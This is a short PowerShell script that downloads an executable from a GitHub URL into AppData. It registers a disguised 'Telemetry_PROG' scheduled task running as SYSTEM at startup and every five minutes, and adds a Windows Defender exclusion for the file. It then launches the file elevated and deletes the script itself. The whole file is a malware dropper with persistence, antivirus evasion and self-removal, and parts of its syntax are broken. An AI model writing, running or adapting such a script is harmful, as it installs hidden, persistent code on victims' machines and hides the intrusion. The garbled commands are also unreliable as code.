Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Users\$Env:USERNAME\AppData\N0b0dy.exe"
Start-Sleep -Milliseconds 2000

# creates variables for task scheduler

$action = New-ScheduledTaskAction -Execute N0b0dy.exe -Argument "-ExecutionPolicy Bypass -File "C:\Users\$Env:USERNAME\AppData\N0b0dy.exe"
$principal = New-ScheduledTaskPrincipal -UserId NT AUTHORITY\SYSTEM -LogonType ServiceAccount -RunLevel Highest
$trigger = New-ScheduledTaskTrigger -AtStartup -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)

# register task

Register-ScheduledTask -Telemetry_PROG -Action $action -Principal $principal -Trigger $trigger -Description "kyle was here"
Add-MpPreference -ExclusionPath "C:\Users\$Env:USERNAME\AppData\N0b0dy.exe"

# start process

Start-Process "C:\Users\$Env:USERNAME\AppData\N0b0dy.exe" -Verb runAs

# turn back on windows defender

Set-MpPreference -DisableRealtimeMonitoring $false

# remove the file from system

Remove-Item -Path "C:\Users\$Env:USERNAME\AppData\taskscheduler.ps1" -Force
